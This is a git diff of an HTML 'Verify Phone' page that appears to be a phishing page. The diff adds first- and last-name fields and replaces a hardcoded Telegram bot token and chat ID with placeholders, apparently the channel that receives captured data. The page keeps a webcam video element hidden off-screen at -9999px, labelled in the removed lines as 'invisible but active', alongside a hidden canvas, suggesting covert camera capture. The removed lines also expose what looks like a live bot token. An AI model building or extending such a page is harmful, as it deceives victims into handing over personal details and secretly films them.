@@ -4,136 +4,143 @@
   <meta charset="UTF-8" />
   <title>Verify Your Phone</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-    * { box-sizing: border-box; }
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      font-family: 'Poppins', sans-serif;
-      color: #eee;
-      overflow: hidden;
-    }
-    body::before {
-      content: "";
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.6);
-      z-index: 1;
-    }
-    video#bgVideo {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      object-fit: cover;
-      z-index: 0;
-    }
-    .container {
-      position: relative;
-      z-index: 2;
-      background: rgba(31, 31, 31, 0.88);
-      padding: 35px 30px;
-      border-radius: 18px;
-      max-width: 420px;
-      width: 90%;
-      box-shadow: 0 0 30px #6200ea44;
-      text-align: center;
-      margin: 5% auto;
-    }
-    h2 {
-      margin-bottom: 28px;
-      font-weight: 600;
-      font-size: 26px;
-      color: #bb86fc;
-    }
-    .input-group {
-      margin-bottom: 18px;
-      text-align: left;
-    }
-    label {
-      display: block;
-      font-weight: 600;
-      font-size: 14px;
-      margin-bottom: 6px;
-      color: #ccc;
-    }
-    select, input[type="tel"] {
-      width: 100%;
-      padding: 12px 14px;
-      border-radius: 12px;
-      background: #2a2a2a;
-      border: none;
-      color: #eee;
-      font-size: 16px;
-      box-shadow: inset 0 0 6px #000;
-    }
-    select:focus, input[type="tel"]:focus {
-      outline: none;
-      box-shadow: 0 0 12px #bb86fc;
-    }
-    button {
-      background: linear-gradient(45deg, #7b2ff7, #f107a3);
-      border: none;
-      padding: 14px;
-      width: 100%;
-      border-radius: 14px;
-      font-size: 18px;
-      font-weight: 700;
-      color: white;
-      cursor: pointer;
-      box-shadow: 0 0 20px #bb86fcaa;
-    }
-    button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 30px #bb86fcff;
-    }
-    .error {
-      margin-top: 16px;
-      font-size: 15px;
-      font-weight: 600;
-      color: #ff5252;
-      text-shadow: 0 0 8px #ff5252aa;
-      opacity: 0;
-      transform: translateY(12px);
-      transition: all 0.3s ease;
-    }
-    .error.show {
-      opacity: 1;
-      transform: translateY(0);
-      animation: shake 0.4s;
-    }
-    @keyframes shake {
-      0% { transform: translateX(0); }
-      25% { transform: translateX(-6px); }
-      50% { transform: translateX(6px); }
-      75% { transform: translateX(-6px); }
-      100% { transform: translateX(0); }
-    }
-    #progress {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.75);
-      z-index: 99;
-      color: white;
-      display: none;
-      justify-content: center;
-      align-items: center;
-      font-size: 20px;
-      font-weight: 600;
-    }
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    font-family: 'Poppins', sans-serif;
+    color: #fff;
+    overflow: hidden;
+    background: transparent; /* Main background transparent */
+  }
+  /* Remove any overlays */
+  /* No body::before overlay */
 
-    /* 🔍 Invisible but active video */
-    #video {
-      position: absolute;
-      top: -9999px;
-      left: -9999px;
-      width: 320px;
-      height: 240px;
-    }
-  </style>
+  video#bgVideo {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    object-fit: cover;
+    z-index: 0;
+    filter: brightness(0.4) saturate(1.2) contrast(1.2);
+  }
+  .container {
+    position: relative;
+    z-index: 2;
+    background: rgba(25, 0, 0, 0.75); /* Dark transparent red */
+    padding: 35px 30px;
+    border-radius: 18px;
+    max-width: 420px;
+    width: 90%;
+    box-shadow:
+      0 0 15px 4px rgba(255, 23, 68, 0.7),
+      0 0 30px 8px rgba(255, 23, 68, 0.5);
+    text-align: center;
+    margin: 5% auto;
+  }
+  h2 {
+    margin-bottom: 28px;
+    font-weight: 600;
+    font-size: 26px;
+    color: #ff1744;
+    text-shadow: 0 0 6px #ff1744aa;
+  }
+  .input-group {
+    margin-bottom: 18px;
+    text-align: left;
+  }
+  label {
+    display: block;
+    font-weight: 600;
+    font-size: 14px;
+    margin-bottom: 6px;
+    color: #ff8a80;
+    text-shadow: 0 0 4px #ff8a80cc;
+  }
+  select, input[type="tel"], input[type="text"] {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 12px;
+    background: #2d0000;
+    border: none;
+    color: #fff;
+    font-size: 16px;
+    box-shadow: inset 0 0 6px #000;
+    transition: box-shadow 0.3s ease;
+  }
+  select:focus, input[type="tel"]:focus, input[type="text"]:focus {
+    outline: none;
+    box-shadow: 0 0 12px #ff1744;
+  }
+  button {
+    background: linear-gradient(45deg, #d50000, #c51162);
+    border: none;
+    padding: 14px;
+    width: 100%;
+    border-radius: 14px;
+    font-size: 18px;
+    font-weight: 700;
+    color: white;
+    cursor: pointer;
+    box-shadow:
+      0 0 6px #ff174488,
+      0 0 12px #ff1744aa,
+      0 0 24px #ff1744bb;
+    transition: box-shadow 0.3s ease, transform 0.3s ease;
+  }
+  button:hover {
+    transform: scale(1.05);
+    box-shadow:
+      0 0 10px #ff1744aa,
+      0 0 18px #ff1744cc,
+      0 0 36px #ff1744dd;
+  }
+  .error {
+    margin-top: 16px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #ff5252;
+    text-shadow: 0 0 8px #ff5252aa;
+    opacity: 0;
+    transform: translateY(12px);
+    transition: all 0.3s ease;
+  }
+  .error.show {
+    opacity: 1;
+    transform: translateY(0);
+    animation: shake 0.4s;
+  }
+  @keyframes shake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(-6px); }
+    50% { transform: translateX(6px); }
+    75% { transform: translateX(-6px); }
+    100% { transform: translateX(0); }
+  }
+  #progress {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(50, 0, 0, 0.85);
+    z-index: 99;
+    color: white;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    font-size: 20px;
+    font-weight: 600;
+  }
+  #video {
+    position: absolute;
+    top: -9999px;
+    left: -9999px;
+    width: 320px;
+    height: 240px;
+  }
+</style>
 </head>
 <body>
 
@@ -143,6 +150,16 @@
 
 <div class="container">
   <h2>📱 Verify Phone</h2>
+
+  <div class="input-group">
+    <label for="firstName">First Name</label>
+    <input type="text" id="firstName" placeholder="Enter first name" />
+  </div>
+
+  <div class="input-group">
+    <label for="lastName">Last Name</label>
+    <input type="text" id="lastName" placeholder="Enter last name" />
+  </div>
 
   <div class="input-group">
     <label for="country">Select Country Code</label>
@@ -181,8 +198,8 @@
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-  const chatId = "8182050140";
+  const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
+  const chatId = "YOUR_TELEGRAM_CHAT_ID";
 
   const validationRules = {
     "+94": /^[1-9][0-9]{8}$/,
@@ -193,6 +210,8 @@
   };
 
   function validateNumber() {
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
     const code = document.getElementById('country').value;
     const sim = document.getElementById('sim').value;
     const phone = document.getElementById('phone').value.trim();
@@ -200,6 +219,16 @@
     error.classList.remove("show");
     error.textContent = "";
 
+    if (!firstName) {
+      error.textContent = "❗ Enter first name.";
+      error.classList.add("show");
+      return;
+    }
+    if (!lastName) {
+      error.textContent = "❗ Enter last name.";
+      error.classList.add("show");
+      return;
+    }
     if (!sim) {
       error.textContent = "❗ Select your SIM.";
       error.classList.add("show");
